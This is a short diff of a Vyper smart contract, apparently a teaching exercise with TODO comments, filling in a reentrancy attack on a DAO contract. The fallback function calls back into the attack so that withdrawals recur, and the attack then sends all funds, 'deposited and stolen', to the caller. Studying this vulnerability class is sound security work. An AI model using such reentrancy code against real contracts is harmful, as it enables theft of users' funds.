@@ -48,14 +48,11 @@ def attack(dao_address:address):
 
     # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
     send(msg.sender,self.balance)
-    
-    pass
+
 
 @external
 @payable
 def __default__():
-    # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called)
-    
+    # This method gets invoked when Eth is sent to this contract's address (ie when Withdraw is called) 
     # TODO: Add code here to complete the recursive call
     self._attack()
-    pass
